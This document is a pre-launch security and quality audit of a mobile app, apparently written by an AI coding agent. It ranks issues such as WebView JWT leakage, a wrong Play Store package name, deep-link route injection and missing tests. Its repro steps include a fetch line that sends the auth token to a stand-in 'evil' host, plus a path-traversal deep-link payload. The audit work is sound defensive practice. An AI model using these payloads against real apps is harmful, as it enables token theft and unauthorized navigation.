# GAP ANALYSIS — what's actually broken before launch

> Audit scope: `windy-pro-mobile` at `wave-7-gap-analysis` (Wave 3 + 4
> landed, `wave-4-verified` tag green). Method: static analysis of every
> route + service + config + doc, plus `jest --coverage`. I did **not** boot
> a live simulator, EAS build, or run network-level probes against live
> servers — see "What I did NOT test" at the bottom.

---

## TOP 5 THINGS THAT WILL SURPRISE GRANT MOST

1. **The in-app links to the Play Store point at the wrong package name.**
   `src/app/appstore/index.tsx:136` and `src/app/_layout.tsx:220` both still
   link to `market://details?id=uk.thewindstorm.windypro`. The real package
   (per `app.json:49`) is `ai.windyword.app`. Every user who taps "Update"
   or "Rate on Play" will get a 404. **P0-3** below.

2. **The chat WebView trusts every origin on earth and injects the JWT into
   each one.** `src/app/(tabs)/chat.tsx:193` sets
   `originWhitelist={['https://*', 'http://*']}` and
   `injectedJavaScriptBeforeContentLoaded` writes `windy_auth_token` into
   `localStorage` before the page loads. If `chat.windychat.ai` ever 301s
   to a third-party domain (CDN misconfig, subdomain takeover, auth
   federation, ad tracker), the redirect target reads the JWT.
   **P0-1** below.

3. **Two Wave-3/4 modules I shipped — `mailApi.ts` and `trust-monitor.ts` —
   have 0% test coverage.** 41 / 41 Wave-3 + 4 *tests* pass, but that doesn't
   help if the tests simply don't exist. `mailApi.ts` is the mail tab's
   network path; `trust-monitor.ts` is the 60 s poll that fires local
   notifications. Neither is exercised by a single line of test code.
   **P1-4** below.

4. **`windychat://room/{id}` has zero input validation.** Every Wave-3
   deep-link goes through `parseWindyUrl`'s `/^[a-zA-Z0-9_-]{1,128}$/`
   sanitizer, and `windypro://session/{id}` has its own `sanitizeSessionId`.
   But `windychat://room/{id}` is handled inline at
   `src/app/_layout.tsx:344` as `parsed.path.replace('room/', '')` → passed
   straight to `router.push()`. A deep link of
   `windychat://room/../auth/login` pushes `/chat/../auth/login`, which
   expo-router resolves against its own path table. **P1-1** below.

5. **Five test suites pre-date Wave 3 and still try to call the password
   login.** `tests/hardening/test-secure-store.test.ts`,
   `tests/contract/test-cloud-api-contract.test.ts`, and three others call
   `cloudApi.login()` which now throws `AuthFlowDeprecatedError`. The suite
   is 733 green / 48 red / 787 total and has been shipping that way for
   two commits. `npm test` without a filter is *not* green. The auth
   coverage they used to provide (refresh mutex, 401 retry) exists in
   `identityApi.test.ts`; the non-auth coverage (upload queue, offline
   behaviour) is now gone. **P1-5** below.

---

## Counts

| Severity | Count |
|---|---:|
| P0 (ship-blocker) | **3** |
| P1 (fix this week) | **7** |
| P2 (polish) | **9** |
| P3 (file and forget) | **4** |

---

## P0 — SHIP-BLOCKERS

### P0-1. WebView originWhitelist accepts all origins; JWT injected into localStorage

- **What's broken.** `src/app/(tabs)/chat.tsx:193` sets
  `originWhitelist={['https://*', 'http://*']}`. `buildInjectedJS()` at
  line 30 writes the account-server JWT (`windy_auth_token`) into the
  page's `localStorage` **before** first content load. Any redirect chain
  landing on a non-`chat.windychat.ai` page — Cloudflare challenge, a 301
  to an auth federation provider, a subdomain takeover, a compromised
  third-party SDK served from the chat domain — will leak the token to
  the redirect target.
- **Repro.** Point a local DNS override for `chat.windychat.ai` at an
  attacker-controlled host serving a page that runs
  `fetch('https://evil/collect?t=' + localStorage.getItem('windy_auth_token'))`.
  Launch the app → Chat tab. The attacker receives the JWT.
- **Fix.** Tighten `originWhitelist` to a single-host list
  (`['https://chat.windychat.ai']` in prod, plus `'http://localhost:3000'`
  in `__DEV__`). Optional hardening: inject the token in
  `onNavigationStateChange` only after confirming the final navigated URL
  matches the expected host, rather than pre-load.
- **Code.** `src/app/(tabs)/chat.tsx:166-194` (WebView block);
  `buildInjectedJS` in the same file.
- **Effort.** 10 min + one smoke test on the Chat tab.

### P0-2. Mail WebView has NO originWhitelist and injects the JWT

- **What's broken.** `src/app/mail/[id].tsx:57` uses `<WebView source={{ uri }}
  injectedJavaScriptBeforeContentLoaded={injectedJS} />` without an
  `originWhitelist`. The default `react-native-webview` behaviour allows
  all origins. The injected JS writes the JWT into `localStorage`. Same
  leak surface as P0-1.
- **Repro.** Any redirect chain out of `windymail.ai/webmail/message/{id}`
  that ends on attacker-controlled HTML receives the JWT.
- **Fix.** Add `originWhitelist={['https://windymail.ai']}` (plus
  `'http://localhost:5173'` in `__DEV__`). Consider rendering the mail
  body natively via a new `GET /api/v1/message/{id}` endpoint on windy-mail
  and deleting the WebView in Wave 5.
- **Code.** `src/app/mail/[id].tsx:56-67`.
- **Effort.** 5 min for the whitelist; multi-wave for the native reader.

### P0-3. Play Store deep link hardcoded to the OLD package name

- **What's broken.** `src/app/appstore/index.tsx:136` and
  `src/app/_layout.tsx:220` both still reference
  `uk.thewindstorm.windypro`, but the current Android package is
  `ai.windyword.app` (`app.json:49`). Every "Rate on Play Store" and every
  "Update available" banner opens a Play Store 404.
- **Repro.** On an Android device, tap the Rate row in the AppStore screen
  OR tap an Expo update notification. Play Store shows "item not found".
- **Fix.** Replace both strings with `ai.windyword.app`. Also change the
  iOS URL slug from `/app/windy-pro/` to `/app/windy-word/` (Apple
  redirects on slug changes but the current slug looks sloppy and may
  outlive the redirect).
- **Code.** `src/app/appstore/index.tsx:136`, `src/app/_layout.tsx:220`.
- **Effort.** 2 min.

---

## P1 — FIX THIS WEEK

### P1-1. `windychat://room/{roomId}` has no sanitization → arbitrary route push

- **What's broken.** `src/app/_layout.tsx:344` extracts the roomId via
  `parsed.path.replace('room/', '')` and pushes straight to
  `/chat/${roomId}`. Wave-3 cross-product links go through
  `parseWindyUrl`'s whitelist; legacy `windychat://` did not get the same
  treatment.
- **Repro.**
  `xcrun simctl openurl booted "windychat://room/..%2Fauth%2Flogin"` —
  router pushes `/chat/../auth/login`. Depending on expo-router's path
  resolver this may land the user on `/auth/login`, or break the stack.
  A crafted Matrix-shaped ID containing `/` or `?` can break typed-routes.
- **Fix.** Reject any roomId that doesn't match Matrix's own format
  (`!localpart:server`) or, simpler, pass the same `SAFE_ID_RE`
  whitelist (`/^[!@][a-zA-Z0-9_-]{1,128}:[a-zA-Z0-9.-]{1,128}$/`) before
  the push. Reject silently with a warn log, matching the existing
  sanitizer pattern.
- **Code.** `src/app/_layout.tsx:339-351`.
- **Effort.** 10 min.

### P1-2. JWT `exp` never checked client-side; expired tokens spray until 401

- **What's broken.** `identityApi.decodeJwtPayload` at
  `src/services/identityApi.ts:386-392` base64-decodes and returns the
  claims. `restoreSession` (line 75) and `persistTokens` (line 320)
  store + trust them without inspecting `exp`. If a device resumes after
  days offline, the UI looks signed-in; every request fires with an
  expired token; each returns 401; `authedFetch` triggers a refresh — which
  will also 401 if the refresh is stale — and only then does the UI drop
  to the login screen.
- **Repro.** Roll the system clock forward 16 min after sign-in; open
  Settings (no request made → no 401 → `isAuthenticated()` still reports
  true). Trigger any call — only then does refresh run.
- **Fix.** Early exit in `restoreSession` when `exp * 1000 < Date.now()`:
  skip `accessToken` hydration but keep `refreshTokenValue` so a refresh
  runs proactively on next API call. Add a cheap `exp` sanity check in
  `isAuthenticated()` so unauthed UI shows immediately on resume.
- **Code.** `src/services/identityApi.ts:72-97` and :108-112.
- **Effort.** 30 min (plus test cases).

### P1-3. Dead-weight auth code path — `storage-cloud.ts` still calls `/api/auth/login`

- **What's broken.** `src/services/storage-cloud.ts:89,151` call
  `ENDPOINTS.AUTH_LOGIN` and `ENDPOINTS.AUTH_REFRESH` (the legacy v1
  password endpoints). `cloudStorageClient.login()` no longer has a
  call site (`grep` confirms), but `cloud-sync.ts` still imports
  `cloudStorageClient`. If anyone ever restores a login call, it will
  silently 404 or 410 post–Wave 3 and the error surfaces to the user as
  "Network error". `ENDPOINTS.AUTH_LOGIN|AUTH_REFRESH` themselves linger
  in `src/config/api.ts:35-37` labelled `@deprecated`.
- **Repro.** N/A — latent.
- **Fix.** Delete `storage-cloud.ts` entirely (the functions it exports
  are unused post-shim). Delete `ENDPOINTS.AUTH_LOGIN|AUTH_REFRESH` and
  `AUTH_REGISTER`. Update the `cloud-sync.ts` import to the storage
  methods on `cloudApi` (shim) or carve out `storageApi.ts` as planned
  in Wave 3's deliverable-4 section.
- **Code.** `src/services/storage-cloud.ts:1-450`; `src/config/api.ts:22-37`.
- **Effort.** 45 min (touches a few imports, requires a build).

### P1-4. `mailApi.ts` and `trust-monitor.ts` have ZERO test coverage

- **What's broken.** `coverage/coverage-summary.json` reports **0%** lines
  for `src/services/mailApi.ts` and `src/services/trust-monitor.ts`. Both
  are Wave-3/4 code I shipped with confident test claims.
  `trust-monitor`'s AppState listener, polling loop, and
  `Notifications.scheduleNotificationAsync` path are all unexercised.
  `mailApi.listInbox` URL construction, auth header, and error mapping
  are unexercised.
- **Fix.** Add two new test files:
  - `src/services/__tests__/mailApi.test.ts` — mock `identityApi.authedFetch`,
    verify URL construction, 200 happy path, 401 pass-through, non-ok
    error mapping.
  - `src/services/__tests__/trust-monitor.test.ts` — mock
    `expo-notifications` + `AppState`, fake timers; verify
    `track/untrack` semantics, baseline seeding, change detection fires
    exactly once per band flip.
- **Code.** New files.
- **Effort.** 45 min.

### P1-5. Five test suites are red because Wave 3 removed password auth

- **What's broken.** `npm test` full run: 7 failed suites / 48 failed tests.
  Five of those seven suites fail with
  `AuthFlowDeprecatedError: cloudApi.login() is deprecated`. We knew
  about this (`docs/known-pre-existing-failures.md`) but did not port
  any of them. The non-auth behaviours they used to cover (upload queue
  retry, offline SecureStore failure handling, concurrent-request mutex)
  now have **no** test coverage anywhere.
- **Fix.** For each suite, replace the `cloudApi.login()` setup with
  the `jest.mock('../identityApi', …)` inline-factory pattern that
  `src/services/__tests__/cloudApi.test.ts` now uses. Delete purely
  password-flow tests; keep upload/offline/retry-mutex tests.
- **Code.** `tests/hardening/test-secure-store.test.ts`,
  `tests/hardening/test-offline-behavior.test.ts`,
  `tests/contract/test-cloud-api-contract.test.ts`,
  `tests/contract/test-upload-contract.test.ts`,
  `tests/stress/api-stress-test.test.ts`.
- **Effort.** 90 min (five suites).

### P1-6. `RECORDING_LIMITS.pro` contract-test drift

- **What's broken.** `tests/contract/test-tier-contract.test.ts:73`
  expects `RECORDING_LIMITS.pro === 1800` s (30 min). Actual value is
  `900` s. Unrelated to Wave 3/4 — pre-existing drift that a prior
  constant change didn't propagate to the contract test. Per the
  "anti-complacency" rule, a failing contract test is *the* authoritative
  signal of contract drift; the failure went ignored for N commits.
- **Fix.** Decide whether the true pro limit is 30 min or 15 min, fix
  the other side to match, remove the red.
- **Code.** `tests/contract/test-tier-contract.test.ts:73`; the source
  constant is in `src/types/license.ts` (per the contract test's import).
- **Effort.** 10 min + product confirmation.

### P1-7. Brand + package drift across 20 docs

- **What's broken.** "Windy Pro" (old product name) appears 59 times
  across 20 docs. `uk.thewindstorm.windypro` (old Android package)
  appears 11 times across 8 docs. Current reality: "Windy Word" + 
  `ai.windyword.app`. Readers will follow stale commands (`eas submit`
  with the wrong ID, App Store Connect lookup with the wrong
  `ascAppId`) and waste hours.
- **Fix.** sed-rename + hand-review. Flag any doc that documents
  pre-Windy-Word vision architecture for retention.
- **Code.** `BRAND-ARCHITECTURE.md`, `PLAY_STORE_LISTING.md`,
  `DEPLOYMENT_CHECKLIST.md`, etc. — full list in `coverage-gaps.md`.
- **Effort.** 60 min.

---

## P2 — POLISH

### P2-1. `cloud/files.tsx:110` is a dead placeholder — tapping a file does nothing useful

- **What's broken.** Tapping a cloud file row shows an `Alert.alert()`
  with the filename and metadata. No download, no preview, no share.
  Comment in code: "For now, show file info. Future: preview/download."
  Shipping reality: this is a visible broken feature on the Cloud tab.
- **Fix.** Either wire `cloudApi.downloadFile(id)` + open via
  `Linking.openURL(file://...)`, or hide the Cloud Files row entirely
  until preview lands.
- **Code.** `src/app/cloud/files.tsx:110`.
- **Effort.** 60 min for a real preview.

### P2-2. `tier` claim trusted pre-heartbeat (5–10 s feature-unlock window)

- **What's broken.** `identityApi.persistTokens` (line 354) mirrors the
  JWT's `tier` claim straight into Zustand. Paid features unlock
  immediately. The server heartbeat (`license.ts`) runs *after* — if a
  forged/stolen JWT (see P1-2) has `tier: translate_pro`, the user sees
  the unlocked UI until heartbeat fails.
- **Fix.** Gate Pro-only UI on `heartbeat.lastSuccess && tier` rather
  than `tier` alone. Or refuse to mirror `tier` until the first
  heartbeat succeeds.
- **Code.** `src/services/identityApi.ts:354-359`; gate sites in
  `licenseService.hasFeature`.
- **Effort.** 2 h.

### P2-3. Device-code polling has no backoff or circuit breaker

- **What's broken.** `identityApi.pollForToken` hits the token endpoint
  every 5 s for up to 15 min without inspecting server health. If
  `/api/v1/oauth/token` is 502 for 14 minutes (CDN issue), the user
  stares at "Waiting for approval…" for 14 minutes and then sees
  "Code expired, try again". No warning, no retry-after suggestion.
- **Fix.** Track consecutive 5xx responses; after 3 in a row, pause
  polling for 30 s and surface a transient "Having trouble reaching the
  server" message. After 6, show a retry CTA instead of the spinner.
- **Code.** `src/services/identityApi.ts:174-237`.
- **Effort.** 45 min.

### P2-4. Ecosystem-status field-name fallbacks (`email_address || address`, etc.)

- **What's broken.** `src/services/ecosystem-status.ts:215-231` handles
  **both** old and new backend field names (`email_address||address`,
  `storage_used_bytes??storage_used`, `passport_id||passport`). The code
  works, but the presence of the fallback layer is a tripwire: next
  backend rename will silently produce blank values on older app builds
  that only know the new-new name.
- **Fix.** Pin the server-side contract with an API version header
  and delete the fallbacks. Separately: add a `test-ecosystem-status.json`
  fixture under `tests/contract/` so drift lights up CI.
- **Code.** `src/services/ecosystem-status.ts:215-231`.
- **Effort.** 2 h (most of which is coordinating with the server team).

### P2-5. Share intent (`sharedText`, `sharedUrl`) params pass untrusted input to the mail tab

- **What's broken.** `_layout.tsx:374-387` forwards `sharedText`/`sharedUrl`
  from SEND-intent deep links to `/(tabs)/mail` without validation.
  Currently unused by `mail.tsx` (safe today). The moment anyone renders
  `sharedUrl` in a WebView or as a clickable link without sanitising, an
  Android malicious-app → `javascript://` payload is a demo.
- **Fix.** Validate with `new URL(sharedUrl).protocol === 'https:' ||
  'http:'`. Truncate `sharedText` to a max length.
- **Code.** `_layout.tsx:374-387`.
- **Effort.** 15 min (preventative, no current exposure).

### P2-6. No biometric gating on SecureStore

- **What's broken.** `expo-secure-store` defaults to device-lock only
  (keychain / EncryptedSharedPreferences). A user with Face ID disabled
  and a 4-digit PIN that an attacker has shoulder-surfed can read every
  stored JWT. Industry standard, but not best-in-class.
- **Fix.** On iOS, pass `keychainAccessible:
  SecureStore.WHEN_UNLOCKED_THIS_DEVICE_ONLY` and
  `requireAuthentication: true` for `windy_jwt_token`. Users enabling
  biometrics will have to Face-ID-unlock on each resume.
- **Code.** Every `SecureStore.setItemAsync` in `identityApi.ts`.
- **Effort.** 3 h (including UX verification — biometric prompts on
  every app resume is a UX regression unless timed well).

### P2-7. `pairManager`, `sync-manager`, `clone-bundle` all below 50% coverage

- **What's broken.** These are the money-and-PII-touching modules.
  Coverage:
  - `pairManager.ts` 51.45 % lines, 42.85 % branches
  - `sync-manager.ts` 39.63 % lines, 32.46 % branches
  - `clone-bundle.ts` 19.80 % lines, 5.88 % branches
  Refund logic, upload failure handling, bundle-builder state machine —
  all undertested.
- **Fix.** Lines first; branches second. Start with `clone-bundle.ts`
  which is the lowest and touches both voice PII and paid plans.
- **Code.** See `docs/audit/coverage-gaps.md`.
- **Effort.** 1 day per module.

### P2-8. `model-crypto.ts` at 70.81 % lines for a crypto module

- **What's broken.** `src/services/model-crypto.ts` — key derivation,
  model-protection watermarking. Crypto should be at 90 %+. At 70 % we
  don't know whether the AEAD-failure path, nonce-reuse guard, or
  derived-key-mismatch path even get exercised.
- **Fix.** Ship negative tests for tamper, wrong key, truncated
  ciphertext, re-use.
- **Code.** `src/services/model-crypto.ts`.
- **Effort.** 4 h.

### P2-9. EternitasBadge still calls the legacy `/registry/verify` endpoint

- **What's broken.** `src/components/EternitasBadge.tsx:17` hits
  `https://api.eternitas.ai/api/v1/registry/verify` — the old badge
  endpoint. Wave 4 added a `TrustBadge` using the canonical
  `/api/v1/trust/{passport}`. Both badges coexist on the
  `/agent/index.tsx:99-100` screen, doubling network calls and showing
  two different "trust score" rendering conventions.
- **Fix.** Retire `EternitasBadge` + `EternitasPassport` components;
  `TrustBadge` replaces both.
- **Code.** `src/components/EternitasBadge.tsx`,
  `src/components/EternitasPassport.tsx`.
- **Effort.** 30 min.

---

## P3 — FILE AND FORGET

### P3-1. Thirteen services have 0 % coverage

See `docs/audit/coverage-gaps.md` — `engine-download`, `feedback`,
`keyboard`, `offline-packs`, `overlay`, `push-notifications`,
`rating-prompt`, `video-capture`, `whisper-manager`, `windytune-nudge`.
Each is a latent surprise.

### P3-2. Sentry DSN is shipped in the bundle (intentional)

`src/app/_layout.tsx:15` reads `EXPO_PUBLIC_SENTRY_DSN`. Sentry DSNs are
designed to be public and rate-limit-gated at the ingest; fine to keep,
noting only that it will appear in App Privacy declarations.

### P3-3. `iOS` App Store slug still says `windy-pro`

`src/app/appstore/index.tsx:135` → `https://apps.apple.com/app/windy-pro/id6759985867`.
Apple follows redirects on name changes, so it currently resolves
correctly. Eventually the slug will be wrong in analytics / share
sheets.

### P3-4. Device-code `slow_down` error handling included but server never sends it

`identityApi.ts:195` accepts `error === 'slow_down'` in the polling
loop as equivalent to `authorization_pending`. Per the account-server
audit, the server never emits `slow_down`. Harmless dead code.

---

## Phase 4.5 — Mobile UI audit (STATIC ONLY, see caveats)

I could not reliably boot a simulator this session
(`launchd_sim` crashed on first attempt). Below is a static code-level
audit of each screen's empty/loading/error states. All findings are
**unverified against running pixels**.

| Screen | Empty state | Loading state | Error state | Notes |
|---|---|---|---|---|
| `/(tabs)/mail` | ✅ "No messages yet" with 📭 icon | ✅ spinner | ✅ retry button | Good. |
| `/(tabs)/mail` unauthed | ✅ "Sign in to see your mail" CTA | — | — | Good. |
| `/settings/trust` no passport | ✅ "No Eternitas passport yet" + enrol CTA | ✅ spinner | ✅ "Couldn't reach Eternitas" | Good. |
| `/auth/device-code` | N/A | ✅ "Starting sign-in…" | ✅ expired / denied / error states all distinct | Good. |
| `/cloud/files` | ⚠️ **No empty state** — empty list with zero UI feedback | ✅ spinner | ✅ | P2-10 (flagged inline below). |
| `/(tabs)/chat` WebView error | ✅ `onError` sets flag | ✅ loader | ❌ No recovery UI if the WebView 500s mid-session | P2-11. |
| `/mail/[id]` invalid id | ✅ "Invalid message id." | ✅ spinner | ❌ No recovery UI if the reader page 404s | P2-12. |

### P2-10. `/cloud/files` has no empty-state when the file list is `[]`

FlatList renders nothing; user sees a blank screen with the search bar.
Add `ListEmptyComponent` with "No files yet — record something to sync."
**Code.** `src/app/cloud/files.tsx`. **Effort.** 15 min.

### P2-11. Chat WebView has no recovery UI on runtime 500

When the WebView inner page errors after initial load, there's no
reload button. The user must close and reopen the app.
**Code.** `src/app/(tabs)/chat.tsx:166-194`. **Effort.** 20 min.

### P2-12. Mail reader has no recovery UI on WebView load failure

Same pattern as P2-11 but for `/mail/[id]`. **Effort.** 15 min.

---

## Phase 7 — Concurrency

Skipped — the mobile client does not own any server endpoints to load
test. The adversarial version of this phase is: can the device-code
polling loop race with an AppState background/foreground transition to
double-request? Verified statically: `identityApi.pollForToken` holds a
single `AbortController` per device session and cancels on unmount;
`deviceSession = null` on every terminal response. Safe.

---

## Phase 8 — Documentation drift (summary)

Full list in `docs/audit/coverage-gaps.md`. Headlines:

- 59 mentions of "Windy Pro" across 20 `.md` files — product renamed to
  "Windy Word" per `app.json:3`. P1-7.
- 11 mentions of `uk.thewindstorm.windypro` across 8 `.md` files — Android
  package renamed to `ai.windyword.app` per `app.json:49`. P0-3 + P1-7.
- `RELEASE_CHECKLIST.md` still declares `Version: 1.0.0 / Build: 2`; actual
  `app.json:6` is `2.0.0` with `buildNumber: 10`. P1-7.

---

## What I did NOT test (confidence caveat)

- **No live simulator boot.** `launchd_sim` crashed on first attempt;
  recovering it is a system-level action I chose not to take
  autonomously. The Phase 4.5 findings are static only.
- **No `eas build`.** Every claim about the production build (signing,
  credential resolution, bundler) is inference from `eas.json` + past
  builds.
- **No live probes to `windyword.ai`, `api.eternitas.ai`, `mail.windymail.ai`,
  `chat.windychat.ai`.** Every "expected response shape" claim in
  `endpoint-inventory.txt` is derived from grep against the mobile code's
  `.json()` consumers and from server code on this machine — not from a
  round-trip call.
- **No `trufflehog`/`gitleaks` scan.** Out-of-band tooling; recommend a CI
  pass before GA.
- **No render-level tests for the 38 screens.** I don't have a React
  Testing Library harness for expo-router and didn't build one tonight.
- **No load test, no concurrency torture.** Mobile is a client; the
  relevant torture lives in the server repos.
- **No app-install on a real device** (iOS or Android). All bundle-size,
  launch-time, and OTA-update claims are uninspected.

If any of those look like "you should have done this," flag and I'll add
another pass.

---

## Phase 10 — What I'm proposing to fix on this branch

P0-3 (Play Store package name) and P1-1 (`windychat://room` sanitization)
are trivial and I'll ship them on `wave-7-gap-analysis` alongside this
analysis. P0-1 and P0-2 (WebView origin whitelists) are also trivial but
I want a manual smoke test on the Chat tab before landing — flagging for
the next pass with the simulator.

Everything else is separate PR material per the Branching Policy.
